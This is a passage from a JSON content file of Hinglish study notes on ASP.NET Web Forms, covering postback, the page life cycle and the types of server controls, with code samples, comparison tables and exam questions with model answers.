        "title": "Postback, AutoPostBack aur cross-page posting",
        "kicker": "Events",
        "points": [
          "**Postback:** page khud ko server par POST karta hai (same .aspx); ViewState ke saath control values wapas aati hain.",
          "**AutoPostBack='true':** TextBox/DropDownList change hote hi turant postback (bina button ke) — `TextChanged`, `SelectedIndexChanged` chalte hain.",
          "**IsPostBack vs IsCallback:** IsCallback AJAX update panel ke partial postback ke liye true hota hai.",
          "**Cross-page posting:** `PostBackUrl='Result.aspx'` se doosre page ko post karo; target page `PreviousPage` se values padhta hai.",
          "**CausesValidation='false':** Cancel button par validation na chale (warna user atak jaata hai).",
          "**Event order:** Page_Load pehle, control event baad mein — isliye Load mein data bind karo, event mein use karo."
        ]
      },
      {
        "type": "comparison",
        "title": "Web Forms vs ASP.NET MVC",
        "kicker": "Comparison",
        "columns": [
          "Web Forms",
          "MVC"
        ],
        "rows": [
          {
            "label": "Model",
            "values": [
              "page + code-behind",
              "Model-View-Controller"
            ]
          },
          {
            "label": "State",
            "values": [
              "ViewState built-in",
              "stateless (no view state)"
            ]
          },
          {
            "label": "URL",
            "values": [
              "file based (X.aspx)",
              "route based (/students/5)"
            ]
          },
          {
            "label": "Control",
            "values": [
              "server controls + postback",
              "HTML + Razor, full control"
            ]
          },
          {
            "label": "Testing",
            "values": [
              "hard (page lifecycle)",
              "easy (controllers unit-testable)"
            ]
          },
          {
            "label": "Best for",
            "values": [
              "intranet/RAD, data forms",
              "public sites, SEO, REST APIs"
            ]
          }
        ],
        "columnColors": [
          "#ff8800",
          "#aa00ff"
        ]
      },
      {
        "type": "diagram",
        "title": "Web Forms — Page, Postback aur Code-behind",
        "kicker": "Diagram",
        "diagram": "wt4-webforms",
        "caption": "Pehli request (GET) → page render; button click → postback → event → naya HTML + ViewState"
      },
      {
        "type": "recap",
        "title": "Recap",
        "kicker": "Revise",
        "points": [
          "**Web Forms:** .aspx (mark-up + server controls) + code-behind (.aspx.cs, System.Web.UI.Page).",
          "**@Page directive:** Language, CodeBehind, Inherits, AutoEventWireup.",
          "**Postback:** page khud ko server par post karta hai; same page dobara process hota hai.",
          "**IsPostBack:** false = first load, true = postback; Page_Load mein check zaroori.",
          "**Events:** Page_Load pehle, control events baad mein; AutoPostBack se turant postback.",
          "**Reuse:** master page, user controls (.ascx), themes; **alternative:** MVC (stateless, testable)."
        ]
      }
    ],
    "examQuestions": [
      {
        "question": "Explain the ASP.NET Web Forms model with the page directive, code-behind and postback.",
        "answer": "**Web Forms** ASP.NET ka **page-based, event-driven** programming model hai.\n\n**Page anatomy:**\n1. **`.aspx` file** — HTML mark-up + server controls (`<asp:TextBox>`, `<asp:Button>`), `runat=\"server\"`.\n2. **`@Page` directive** — Language, AutoEventWireup, CodeBehind, Inherits — mark-up ko code-behind class se jodta hai.\n3. **Code-behind (`.aspx.cs`)** — class `System.Web.UI.Page` se inherit karti hai; event handlers aur Page_Load yahan.\n4. **Designer file** — Visual Studio generated control fields.\n\n**Postback:** HTTP stateless hai, isliye Web Forms me page **khud ko** POST karta hai.\n- Pehli request: `IsPostBack = false` → default values set karo.\n- Button click / dropdown change: `IsPostBack = true` → control event (`btnSave_Click`) server par chalta hai.\n- Values kaise bachti hain? **ViewState** (base64 hidden field) se.\n\n**AutoPostBack:** TextBox/DropDownList ke change par bina button turant postback.\n\n**Event order:** Page_Load → control events (Click) → PreRender → Render. Isliye Page_Load mein data load karo, event mein use karo.\n\n**Reusability:** master pages (`.master`), user controls (`.ascx`), themes/skins.\n\n**Web Forms vs MVC:** Web Forms = ViewState + server controls + RAD (intranet/data-entry ke liye); MVC = stateless, SEO-friendly, testable (public sites/APIs).\n\n**Diagram:** Refer to the Web Forms — Page, Postback aur Code-behind diagram."
      },
      {
        "question": "What is postback? Explain IsPostBack, AutoPostBack and cross-page posting with examples.",
        "answer": "**Postback:** jab page apne aap ko (same URL par) server par POST karta hai, taaki server controls ke events handle ho sakein. HTTP stateless hai, isliye ye mechanism events ko possible banata hai.\n\n**1. IsPostBack** — Page class ki property:\n```csharp\nprotected void Page_Load(object sender, EventArgs e)\n{\n    if (!IsPostBack)          // sirf pehli request\n    {\n        ddlCity.DataSource = GetCities();\n        ddlCity.DataBind();\n    }\n}\n```\nIske bina dropdown har postback par rebind hoga aur user ka selection ud jaayega.\n\n**2. AutoPostBack** — control property:\n```html\n<asp:DropDownList ID=\"ddlState\" runat=\"server\" AutoPostBack=\"true\"\n     OnSelectedIndexChanged=\"ddlState_SelectedIndexChanged\" />\n```\nState change hote hi page post hota hai aur handler chalta hai (city list load ho sakti hai). Nuksaan: har change par full page round-trip (AJAX UpdatePanel se kam kiya ja sakta hai).\n\n**3. Cross-page posting:**\n```html\n<asp:Button ID=\"btnNext\" runat=\"server\" PostBackUrl=\"~/Result.aspx\" Text=\"Next\" />\n```\nTarget page `PreviousPage` se values padhta hai:\n```csharp\nTextBox t = (TextBox)PreviousPage.FindControl(\"txtName\");\n```\n\n**Related:** `IsCallback` (AJAX partial postback), `CausesValidation=\"false\"` (cancel button), `ValidationGroup` (sirf apne controls validate).\n\n**Kyun important:** postback ke bina server controls ke events nahi chalte; IsPostBack ke bina data binding aur event logic mix ho jaate hain.\n\n**Diagram:** Refer to the Web Forms — Page, Postback aur Code-behind diagram."
      },
      {
        "question": "Differentiate between ASP.NET Web Forms and ASP.NET MVC.",
        "answer": "Dono ASP.NET ke programming models hain, approach alag hai.\n\n| Point | Web Forms | MVC |\n|---|---|---|\n| Architecture | page + code-behind | Model-View-Controller |\n| Programming | event-driven (Button_Click) | request/action based |\n| State | **ViewState** built-in | stateless |\n| URL | file based (`/Register.aspx`) | route based (`/student/edit/5`) |\n| Control | server controls, postback | HTML/Razor, full control |\n| Testability | mushkil (page lifecycle) | easy (controller unit tests) |\n| SEO | kam (viewstate, URLs) | better (clean URLs) |\n| Learning curve | easy (RAD, drag-drop) | medium (patterns) |\n| Best for | intranet, data-entry forms, rapid dev | public websites, REST APIs, large teams |\n\n**Web Forms ke fayde:** fast development, rich server controls (GridView, Validators), ViewState se state free mein, designer support.\n**Web Forms ke nuksaan:** bhaari ViewState, HTML par kam control, testing mushkil, SEO kam.\n\n**MVC ke fayde:** separation of concerns, testable, clean URLs, full HTML control, better for APIs.\n**MVC ke nuksaan:** ViewState nahi (state khud manage karo), zyada boilerplate, RAD kam.\n\n**Note:** ASP.NET Core (2016+) mein Web Forms nahi hai — wahan MVC/Razor Pages/Blazor hain; classic Web Forms sirf .NET Framework par chalta hai.\n\n**Diagram:** Refer to the Web Forms — Page, Postback aur Code-behind diagram."
      }
    ]
  },
  {
    "id": "page-lifecycle",
    "number": "4.4",
    "title": "ASP.NET Page Life Cycle",
    "subtitle": "PreInit se Unload tak — kaun sa event kab chalta hai",
    "icon": "cycle",
    "accent": "#aa00ff",
    "englishDefinition": "The ASP.NET page life cycle is the fixed sequence of stages a Page object passes through on every request: PreInit (master page, theme and profile properties can still be changed), Init (control tree created, UniqueID set), InitComplete, PreLoad (view state is loaded into controls just before Load), Load (Page_Load fires; data binding usually happens here), control event handling (RaisePostBackEvent runs the postback event handlers such as Click), LoadComplete, PreRender (last chance to change control properties before rendering), SaveState (view state is serialised into the hidden field), SaveStateComplete, Render (controls write HTML into the response), and Unload (cleanup; response already sent). On a postback, postback data and view state are restored between Init and Load, and control events are raised after Load; on the first request no postback data exists and IsPostBack is false. Understanding the order explains classic bugs such as dynamically added controls disappearing, dropdown selections resetting, or data-bound values being overwritten by Page_Load.",
    "intro": "ASP.NET page apne aap ko har request par dobara banata hai — aur wo nirmaan ek **fixed order** mein hota hai: **PreInit → Init → Load → control events → PreRender → SaveState → Render → Unload**. Is order ko jaanne se wahi classic bugs samajh aate hain — 'dropdown ki value reset ho gayi', 'dynamically add kiya control postback par gayab hai', 'Page_Load ne bind karke user ka selection overwrite kar diya'. Exam mein lifecycle ke stages aur unme kya hota hai — ye pakka sawaal hai.",
    "sections": [
      {
        "type": "definition",
        "title": "Page life cycle kya hai",
        "kicker": "Definition",
        "body": "Page life cycle wo **stages ka sequence** hai jo har `.aspx` page object request par se guzarta hai — object banne se lekar response bhejne aur memory se hatne tak. Har stage par ek event fire hota hai jahan developer code likh sakta hai.",
        "body2": "Do path hote hain: **first request** (GET, IsPostBack = false) aur **postback** (POST, IsPostBack = true). Postback mein extra kaam hota hai — ViewState aur post data **restore** karna, phir control events raise karna.",
        "chips": [
          "PreInit → Unload",
          "Page_Load",
          "RaisePostBackEvent",
          "PreRender",
          "Render"
        ]
      },
      {
        "type": "points",
        "title": "Lifecycle ke stages (order mein)",
        "kicker": "Stages",
        "points": [
          "**1. PreInit** — master page, theme aur profile properties set kar sakte ho; IsPostBack yahan available hai; dynamically master page badalna ho to yahan.",
          "**2. Init** — control tree banta hai, har control ka UniqueID set hota hai; control ki values abhi load nahi hui.",
          "**3. InitComplete** — sab controls initialise ho gaye; ViewState tracking on.",
          "**4. PreLoad** — Load se pehle; **ViewState aur postback data** control properties me load hote hain.",
          "**5. Load** — `Page_Load` chalta hai (yahan `IsPostBack` check karke data bind karo); control ka **Load** event bhi.",
          "**6. Control events (RaisePostBackEvent)** — postback ka asli event: `btnSave_Click`, `TextChanged`, `SelectedIndexChanged`.",
          "**7. LoadComplete** — page aur controls ka load poora.",
          "**8. PreRender** — HTML banne se pehle aakhri mauka: control properties badlo, GridView ka data bind karo.",
          "**9. SaveState → SaveStateComplete** — control ka ViewState serialise hoke `__VIEWSTATE` hidden field mein jaata hai.",
          "**10. Render** — controls apna HTML response mein likhte hain (yahan ViewState ka HTML bhi add hota hai).",
          "**11. Unload** — response ja chuka; cleanup, connection close (response change nahi ho sakta)."
        ]
      },
      {
        "type": "comparison",
        "title": "First request vs Postback",
        "kicker": "Comparison",
        "columns": [
          "First request (GET)",
          "Postback (POST)"
        ],
        "rows": [
          {
            "label": "IsPostBack",
            "values": [
              "false",
              "true"
            ]
          },
          {
            "label": "ViewState",
            "values": [
              "khaali (koi hidden field nahi)",
              "hidden field se restore"
            ]
          },
          {
            "label": "Control values",
            "values": [
              "default / markup values",
              "user ke bheje values"
            ]
          },
          {
            "label": "Control events",
            "values": [
              "nahi chalte",
              "Click / Changed chalte hain"
            ]
          },
          {
            "label": "Page_Load",
            "values": [
              "initialise + bind",
              "sirf refresh logic"
            ]
          },
          {
            "label": "Example",
            "values": [
              "URL kholna",
              "Save button dabana"
            ]
          }
        ],
        "columnColors": [
          "#00d4ff",
          "#aa00ff"
        ]
      },
      {
        "type": "codeoutput",
        "kicker": "Code + Output",
        "title": "Lifecycle trace — kaun sa event kab",
        "code": "using System;\n\npublic partial class Trace : System.Web.UI.Page\n{\n    private void Log(string stage)\n    {\n        lblLog.Text += stage + \" → \";\n    }\n\n    protected void Page_PreInit(object sender, EventArgs e)   { Log(\"PreInit\"); }\n    protected void Page_Init(object sender, EventArgs e)      { Log(\"Init\"); }\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        Log(IsPostBack ? \"Load(postback)\" : \"Load(first)\");\n    }\n    protected void Page_PreRender(object sender, EventArgs e) { Log(\"PreRender\"); }\n    protected void Page_Render(object sender, EventArgs e)    { Log(\"Render\"); }\n    protected void Page_Unload(object sender, EventArgs e)    { /* logging only */ }\n\n    protected void btnGo_Click(object sender, EventArgs e)\n    {\n        Log(\"Click\");\n    }\n}",
        "language": "csharp",
        "filename": "Trace.aspx.cs",
        "php": "Pehli request:\nPreInit → Init → Load(first) → PreRender → Render\n\nButton click (postback):\nPreInit → Init → Load(postback) → Click → PreRender → Render",
        "label": "Rendered output",
        "height": 220,
        "outputHint": "ASP.NET · rendered output",
        "outputNote": "ASP.NET server par compile hota hai — browser ko sirf rendered HTML milta hai.",
        "intro": "Har stage par log likh kar order verify kar sakte ho — click event Load ke **baad** aata hai, isliye Page_Load mein user ka kaam overwrite na karo."
      },
      {
        "type": "points",
        "title": "Isi wajah se aane wale bugs",
        "kicker": "Common Bugs",
        "points": [
          "**Dropdown reset ho gaya:** Page_Load mein bina `IsPostBack` check ke rebind kiya → user ka selection overwrite.",
          "**Dynamic control gayab:** control Page_Load mein add kiya par har postback par dobara add nahi kiya → ViewState load nahi hua.",
          "**Value purani dikhti hai:** Load mein database se value daali aur event ka change Load ke baad hua → order ka farq.",
          "**Response.Redirect error:** Render/Unload ke baad redirect nahi kar sakte (headers ja chuke).",
          "**Data bind dobara:** PreRender mein bind karo to har postback par fresh data milta hai.",
          "**ViewState bhaari:** SaveState se pehle bade grids disable karo (`EnableViewState='false'`) — page size kam."
        ]
      },
      {
        "type": "diagram",
        "title": "Page Life Cycle Timeline",
        "kicker": "Diagram",
        "diagram": "wt4-lifecycle",
        "caption": "PreInit → Init → PreLoad → Load → control events → PreRender → SaveState → Render → Unload"
      },
      {
        "type": "recap",
        "title": "Recap",
        "kicker": "Revise",
        "points": [
          "**Order:** PreInit, Init, InitComplete, PreLoad, Load, control events, LoadComplete, PreRender, SaveState, SaveStateComplete, Render, Unload.",
          "**PreInit:** master page/theme badalne ka aakhri mauka; **Init:** control tree banti hai.",
          "**PreLoad:** ViewState + post data restore; **Load:** Page_Load (IsPostBack check).",
          "**Control events:** Load ke baad — Click, TextChanged, SelectedIndexChanged.",
          "**PreRender:** render se pehle properties ka final change; **SaveState:** ViewState serialize.",
          "**Render:** HTML response; **Unload:** cleanup (response change nahi)."
        ]
      }
    ],
    "examQuestions": [
      {
        "question": "Explain the ASP.NET page life cycle with all its stages in order.",
        "answer": "Page life cycle har request par same sequence follow karta hai.\n\n| # | Stage | Kya hota hai |\n|---|---|---|\n| 1 | **PreInit** | master page, theme, profile set kar sakte ho; IsPostBack available |\n| 2 | **Init** | control tree banti hai, UniqueID assign, ViewState tracking on |\n| 3 | **InitComplete** | saare controls initialise ho gaye |\n| 4 | **PreLoad** | ViewState aur postback data control properties mein load |\n| 5 | **Load** | Page_Load chalta hai (IsPostBack check yahin) |\n| 6 | **Control events** | RaisePostBackEvent — btnSave_Click, TextChanged |\n| 7 | **LoadComplete** | page + controls ka load poora |\n| 8 | **PreRender** | render se pehle aakhri change (properties, final bind) |\n| 9 | **SaveState** | ViewState serialize → __VIEWSTATE hidden field |\n| 10 | **SaveStateComplete** | state saving done |\n| 11 | **Render** | controls HTML response mein likhte hain |\n| 12 | **Unload** | cleanup; response ja chuka |\n\n**Postback par extra steps:** Init ke baad ViewState restore hota hai (LoadValue), aur post data load hota hai; phir Load, phir control events.\n\n**Practical rules:**\n- Data binding **Page_Load** mein `if (!IsPostBack)` ke saath.\n- Dynamic controls har postback par **Init/PreInit** mein dobara banao (warna ViewState nahi milega).\n- Response.Redirect **Render se pehle** karo.\n- Bade grids par `EnableViewState=\"false\"` se page size kam karo.\n\n**Diagram:** Refer to the Page Life Cycle Timeline diagram."
      },
      {
        "question": "Differentiate between the first request and a postback in the page life cycle.",
        "answer": "Dono ka sequence same dikhta hai, par andar ka kaam alag hai.\n\n| Point | First request (GET) | Postback (POST) |\n|---|---|---|\n| IsPostBack | false | true |\n| ViewState | koi hidden field nahi aati | pehle se bheja hua ViewState restore hota hai |\n| Postback data | nahi | form data (textbox values, dropdown selection) load hota hai |\n| Control values | mark-up / defaults | user ke bheje hue values |\n| Control events | nahi chalte | RaisePostBackEvent → Click/Changed |\n| Page_Load | initialise: data bind, defaults | refresh: sirf updated values handle |\n| Typical | URL kholna, first visit | button click, dropdown change |\n| ViewState output | render par banti hai | restore + dobara save |\n\n**Flow comparison:**\n- **First request:** PreInit → Init → Load (IsPostBack false) → PreRender → SaveState → Render.\n- **Postback:** PreInit → Init → **LoadViewState + LoadPostData** → Load (IsPostBack true) → **control event** → PreRender → SaveState → Render.\n\n**IsPostBack ka use:**\n```csharp\nprotected void Page_Load(object sender, EventArgs e)\n{\n    if (!IsPostBack)\n    {\n        BindGrid();     // sirf pehli baar\n    }\n}\n```\n\n**Galti:** bina check bind karna → har postback par user ka selection/scroll reset, performance loss, event ka result overwrite.\n\n**Diagram:** Refer to the Page Life Cycle Timeline diagram."
      },
      {
        "question": "Why do dynamically created controls disappear on postback? Explain with the life cycle.",
        "answer": "**Problem:** Page_Load mein banaya gaya control pehli baar dikhta hai, par button click ke baad **gayab** ho jaata hai.\n\n**Reason (life cycle se juda):**\n1. Postback par page **naya** object hai — purana control tree maujood nahi.\n2. **Init/PreLoad** ke waqt ASP.NET ViewState aur postback data ko control tree ke hisaab se restore karta hai.\n3. Agar aapne control **Load ke baad** banaya (ya sirf `!IsPostBack` mein), to restore ke waqt wo control tree mein hi nahi tha.\n4. Isliye uski ViewState load nahi hoti aur control render mein nahi aata.\n\n**Solution:**\n```csharp\nprotected void Page_Init(object sender, EventArgs e)\n{\n    // HAR request par (postback bhi) same controls banao\n    TextBox tb = new TextBox();\n    tb.ID = \"txtDynamic\";\n    phHolder.Controls.Add(tb);\n}\n```\n- Controls **PreInit/Init** mein banao, har request par **same ID** ke saath.\n- Hijacking se bachne ke liye ID badalti na rahe.\n- Value read karne ke liye `Request.Form[\"txtDynamic\"]` ya control ko dobara find karo.\n\n**Related mistakes:** `!IsPostBack` block mein control banana, ID har baar badalna, master page/theme Load mein badalna (PreInit mein chahiye).\n\n**Diagram:** Refer to the Page Life Cycle Timeline diagram."
      }
    ]
  },
  {
    "id": "server-controls",
    "number": "4.5",
    "title": "Types of ASP.NET Server Controls",
    "subtitle": "HTML, Web, Validation, Data, User aur Custom controls",
    "icon": "layers",
    "accent": "#00d4ff",
    "englishDefinition": "ASP.NET controls are server-side components that run on the web server, expose properties, methods and events, and render themselves as HTML to the browser. They are classified as: HTML controls (HtmlInputText, HtmlForm) used with runat='server' over plain HTML tags and giving limited server-side access; HTML server controls' richer counterpart, Web (standard) server controls (Label, TextBox, Button, DropDownList, CheckBox, RadioButton, GridView) declared with the asp: prefix and the WebControl namespace; validation controls (RequiredFieldValidator, RangeValidator, CompareValidator, RegularExpressionValidator, CustomValidator, ValidationSummary) that validate input on the client and/or server; data controls (GridView, Repeater, DataList, FormView, DetailsView) that bind to data sources; rich controls (Calendar, AdRotator, FileUpload); user controls (.ascx) built by a developer and registered with the @Register directive; and custom controls compiled classes deriving from WebControl or Control and placed in the toolbox. All server controls require runat='server' and are processed by the ASP.NET page parser into HTML. Web (standard) server controls are differentiated by their ability to adapt output to the requesting browser.",
    "intro": "ASP.NET controls ek badi family hain, aur interview mein sabse pehle yahi poochha jaata hai: **HTML controls vs Web controls vs Validation vs Data vs User vs Custom**. Basic rule — har control `runat='server'` ke saath server par chalta hai aur browser ko **HTML** banake bhejta hai. Farq ye hai ki kaun banata hai aur kya control karta hai: HTML controls = plain tags ko server-side access, Web controls = rich properties/events (browser ke hisaab se output), Validation = input check, Data = grid/list, User/Custom = reuse.",
    "sections": [
      {
        "type": "definition",
        "title": "Server control kya hai",
        "kicker": "Foundation",
        "body": "Server control wo component hai jo **server par** chalta hai, properties/methods/events rakhta hai, aur render hone par browser ke liye **HTML** ban jaata hai. Mark-up mein har control par `runat='server'` likhna zaroori hai.",
        "body2": "Page parser `runat='server'` dekhte hi us tag ko control object bana deta hai, jise code-behind direct naam se use karta hai (jaise `txtName.Text`). Control ka output plain HTML hota hai — browser ko ASP.NET ka pata nahi chalta.",
        "chips": [
          "runat=server",
          "asp: prefix",
          "properties/events",
          "renders HTML",
          "ViewState"
        ]
      },
      {
        "type": "cards",
        "title": "Control ke 6 types",
        "kicker": "Key Points",
        "cards": [
          {
            "icon": "code",
            "title": "HTML server controls",
            "body": "Plain HTML tags + `runat='server'`: `HtmlInputText`, `HtmlForm`. Kam properties, purana code migrate karne ke liye."
          },
          {
            "icon": "layout",
            "title": "Web (standard) controls",
            "body": "`asp:` prefix: Label, TextBox, Button, DropDownList, CheckBox, RadioButton, ListBox, Image."
          },
          {
            "icon": "check",
            "title": "Validation controls",
            "body": "RequiredField, Range, Compare, RegularExpression, Custom, ValidationSummary — page par input validate karte hain."
          },
          {
            "icon": "table",
            "title": "Data controls",
            "body": "GridView, Repeater, DataList, FormView, DetailsView, DataPager — data source se bind hoke rows/cards banate hain."
          },
          {
            "icon": "layers",
            "title": "User controls (.ascx)",
            "body": "Developer ke banaye chhote reuse blocks; `<%@ Register %>` se register; ek se zyada pages par use."
          },
          {
            "icon": "puzzle",
            "title": "Custom controls",
            "body": "Compiled class jo `WebControl`/`Control` se derive karti hai; DLL banake toolbox mein add; poore project mein reuse."
          }
        ]
      },
      {
        "type": "comparison",
        "title": "HTML controls vs Web controls",
        "kicker": "Comparison",
        "columns": [
          "HTML server controls",
          "Web server controls"
        ],
        "rows": [
          {
            "label": "Mark-up",
            "values": [
              "<input type=text runat=server>",
              "<asp:TextBox runat=server>"
            ]
          },
          {
            "label": "Class",
            "values": [
              "System.Web.UI.HtmlControls",
              "System.Web.UI.WebControls"
            ]
          },
          {
            "label": "Browser detect",
            "values": [
              "nahi",
              "haan — output browser ke hisaab se"
            ]
          },
          {
            "label": "Properties",
            "values": [
              "kam (HTML attributes)",
              "zyada (Text, BackColor, CssClass...)"
            ]
          },
          {
            "label": "Events",
            "values": [
              "limited",
              "rich (Click, TextChanged...)"
            ]
          },
          {
            "label": "Mixing with HTML",
            "values": [
              "easy",
              "easy but renders its own HTML"
            ]
          },
          {
            "label": "Kab use karein",
            "values": [
              "purana HTML page migrate",
              "naya development"
            ]
          }
        ],
        "columnColors": [
          "#00d4ff",
          "#ff8800"
        ]
      },
      {
        "type": "code",
        "title": "Common Web controls — properties aur events",
        "kicker": "Code",
        "code": "<asp:Label     ID=\"lblTitle\" runat=\"server\" Text=\"Student Form\" /><br />\n<asp:TextBox   ID=\"txtName\"  runat=\"server\" MaxLength=\"40\" /><br />\n<asp:TextBox   ID=\"txtAge\"   runat=\"server\" TextMode=\"Number\" /><br />\n\n<asp:RadioButton ID=\"rdoMCA\" runat=\"server\" Text=\"MCA\" GroupName=\"course\" />\n<asp:RadioButton ID=\"rdoBCA\" runat=\"server\" Text=\"BCA\" GroupName=\"course\" /><br />\n\n<asp:CheckBox  ID=\"chkHostel\" runat=\"server\" Text=\"Hostel required\" /><br />\n\n<asp:DropDownList ID=\"ddlCity\" runat=\"server\" AutoPostBack=\"true\"\n     OnSelectedIndexChanged=\"ddlCity_Changed\">\n    <asp:ListItem Text=\"-- select --\" Value=\"\" />\n    <asp:ListItem Text=\"Pune\"  Value=\"PNQ\" />\n    <asp:ListItem Text=\"Mumbai\" Value=\"BOM\" />\n</asp:DropDownList><br />\n\n<asp:Button    ID=\"btnSave\" runat=\"server\" Text=\"Save\"\n               OnClick=\"btnSave_Click\" CssClass=\"btn\" />\n<asp:HyperLink ID=\"lnkHome\" runat=\"server\" NavigateUrl=\"~/Default.aspx\"\n               Text=\"Home\" />",
        "language": "aspx",
        "filename": "Controls.aspx",
        "intro": "ID property se code-behind mein control ka access milta hai; GroupName se radio buttons ek group bante hain.",
        "note": "GridView/Repeater jaise data controls ka Output section next topics mein aayega."
      },
      {
        "type": "codeoutput",
        "kicker": "Code + Output",
        "title": "Code-behind se controls padhna",
        "code": "using System;\n\npublic partial class Controls : System.Web.UI.Page\n{\n    protected void btnSave_Click(object sender, EventArgs e)\n    {\n        string course = rdoMCA.Checked ? \"MCA\"\n                      : rdoBCA.Checked ? \"BCA\" : \"-\";\n\n        lblTitle.Text = \"Saved: \" + txtName.Text\n                      + \" | Age: \" + txtAge.Text\n                      + \" | Course: \" + course\n                      + \" | City: \" + ddlCity.SelectedValue\n                      + \" | Hostel: \" + chkHostel.Checked;\n    }\n}",
        "language": "csharp",
        "filename": "Controls.aspx.cs",
        "php": "Student Form\n\n[ Riya ]  [ 22 ]   ( ) MCA  ( ) BCA   [x] Hostel required\n[ Pune v ]\n[ Save ]\n\nSaved: Riya | Age: 22 | Course: MCA | City: PNQ | Hostel: True",
        "label": "Rendered output",
        "height": 230,
        "outputHint": "ASP.NET · rendered output",
        "outputNote": "ASP.NET server par compile hota hai — browser ko sirf rendered HTML milta hai.",
        "intro": "Har control ek object hai — `.Text`, `.Checked`, `.SelectedValue` se value padho."
      },
      {
        "type": "points",
        "title": "Validation, data, user aur custom controls",
        "kicker": "Families",
        "points": [
          "**Validation controls:** RequiredFieldValidator (khaali na ho), RangeValidator (min–max), CompareValidator (do field compare), RegularExpressionValidator (email/pattern), CustomValidator (apna logic), ValidationSummary (saari errors ek jagah).",
          "**Client + server:** browser par JavaScript se check, aur `Page.IsValid` se server par dobara — security ke liye server check zaroori.",
          "**Data controls:** GridView (table + edit/delete), Repeater (custom template, halka), DataList (repeat columns), FormView/DetailsView (ek record).",
          "**User control (.ascx):** markup + code, `<%@ Register TagPrefix='uc' TagName='Menu' Src='~/Menu.ascx' %>` ke baad `<uc:Menu runat='server' />`.",
          "**Custom control:** class library mein `public class MyBox : WebControl { protected override void Render(...) }`, DLL toolbox mein add — professional reuse.",
          "**Master page vs user control:** master page site ka layout (ek), user control reusable widget (kai pages par)."
        ]
      },
      {
        "type": "diagram",
        "title": "ASP.NET Server Controls — Types",
        "kicker": "Diagram",
        "diagram": "wt4-controls",
        "caption": "HTML, Web, Validation, Data, User aur Custom controls — sab server par chalte hain, browser ko HTML jaata hai"
      },
      {
        "type": "recap",
        "title": "Recap",
        "kicker": "Revise",
        "points": [
          "**Server control:** server par chalta hai, properties/events rakhta hai, HTML render karta hai; `runat='server'` zaroori.",
          "**HTML controls:** plain tags + runat=server, HtmlControls namespace, kam features.",
          "**Web controls:** `asp:` prefix, WebControls namespace, browser ke hisaab se output, rich events.",
          "**Validation:** RequiredField, Range, Compare, RegularExpression, Custom + ValidationSummary; IsValid server par check.",
          "**Data controls:** GridView, Repeater, DataList, FormView, DetailsView.",
          "**User (.ascx, @Register) vs Custom (compiled WebControl class)** — dono reuse ke liye."
        ]
      }
    ],
    "examQuestions": [
      {
        "question": "Explain the types of ASP.NET server controls with examples.",
        "answer": "ASP.NET server controls server par chalte hain, `runat=\"server\"` ke saath declare hote hain aur browser ko HTML render karte hain.\n\n**1. HTML server controls**\n- Plain HTML tags + `runat=\"server\"`: `<input type=\"text\" id=\"txt\" runat=\"server\" />`\n- Class: `System.Web.UI.HtmlControls` (HtmlInputText, HtmlForm, HtmlTable)\n- Kam properties/events; purane HTML pages ko server-side banane ke liye.\n\n**2. Web (standard) server controls**\n- `asp:` prefix: `<asp:TextBox ID=\"txtName\" runat=\"server\" />`\n- Class: `System.Web.UI.WebControls`\n- Rich properties (Text, BackColor, CssClass, Enabled), rich events (Click, TextChanged), **browser ke hisaab se** output.\n\n**3. Validation controls**\n- RequiredFieldValidator, RangeValidator, CompareValidator, RegularExpressionValidator, CustomValidator, ValidationSummary.\n- Client-side JS + server-side (`Page.IsValid`) dono par validate.\n\n**4. Data controls**\n- GridView, Repeater, DataList, FormView, DetailsView, DataPager — data source se bind ho kar rows/cards banate hain.\n\n**5. User controls (.ascx)**\n- Developer banata hai; `<%@ Register %>` directive se register; kai pages par reuse; apni properties/events.\n\n**6. Custom controls**\n- Compiled class (`WebControl`/`Control` se derive), DLL, toolbox mein add, poore project/machine par reuse.\n\n**Rich controls** (Calendar, AdRotator, FileUpload) ko alag group bhi maana jaata hai.\n\n**Diagram:** Refer to the ASP.NET Server Controls — Types diagram."
      },
      {
        "question": "Differentiate between HTML server controls and Web server controls.",
        "answer": "Dono server par chalte hain, par namespace, features aur rendering alag hai.\n\n| Point | HTML server controls | Web server controls |\n|---|---|---|\n| Mark-up | `<input type=\"text\" runat=\"server\">` | `<asp:TextBox runat=\"server\">` |\n| Namespace | System.Web.UI.HtmlControls | System.Web.UI.WebControls |\n| Mapping | HTML tag ke 1:1 (HtmlInputText) | apni class (TextBox) |\n| Browser detection | nahi | haan — up-level/down-level output |\n| Properties | kam, HTML attributes tak | bahut zyada (style, skin, theme) |\n| Events | limited | rich (Click, TextChanged, Command) |\n| Validation se link | mushkil | `ControlToValidate` se seedha |\n| Themes/skins | support nahi | support haan |\n| Best use | purana HTML migrate, chhota tweak | naya development |\n\n**Example — same kaam, do tarike:**\n```html\n<input type=\"text\" id=\"txt1\" runat=\"server\" />        <!-- HTML -->\n<asp:TextBox id=\"txt2\" runat=\"server\" />              <!-- Web -->\n```\n\n**Fayde Web controls ke:** consistent API, validation/themes/ViewState integration, browser-adaptive HTML.\n**Fayde HTML controls ke:** halka, minimal HTML output, designer ka full control.\n\n**Diagram:** Refer to the ASP.NET Server Controls — Types diagram."
      },
      {
        "question": "Explain validation controls in ASP.NET with the properties of RequiredFieldValidator and RangeValidator.",
        "answer": "Validation controls user ke input ko **client + server** dono par check karte hain — bina page reload ke error message dikhate hain.\n\n**Validation controls:**\n\n| Control | Kaam |\n|---|---|\n| RequiredFieldValidator | field khaali na ho |\n| RangeValidator | value min–max ke beech (number/date/string) |\n| CompareValidator | do fields compare / type check |\n| RegularExpressionValidator | pattern (email, pincode) |\n| CustomValidator | apni custom method (client + server) |\n| ValidationSummary | saare errors ek jagah |\n\n**Common properties (sab par):**\n- `ControlToValidate` — kaun sa input check karna hai.\n- `ErrorMessage` — ValidationSummary mein dikhne wala text.\n- `Text` — control ke paas dikhne wala short message.\n- `Display` — Static / Dynamic / None (layout par asar).\n- `ValidationGroup` — sirf ek group validate (multiple buttons ke liye).\n- `SetFocusOnError`, `Enabled`, `EnableClientScript`.\n\n**RequiredFieldValidator:**\n```html\n<asp:TextBox ID=\"txtName\" runat=\"server\" />\n<asp:RequiredFieldValidator ID=\"rfvName\" runat=\"server\"\n     ControlToValidate=\"txtName\" ErrorMessage=\"Name required\"\n     Text=\"*\" ForeColor=\"Red\" />\n```\n\n**RangeValidator:**\n```html\n<asp:TextBox ID=\"txtAge\" runat=\"server\" />\n<asp:RangeValidator ID=\"rvAge\" runat=\"server\"\n     ControlToValidate=\"txtAge\" Type=\"Integer\"\n     MinimumValue=\"18\" 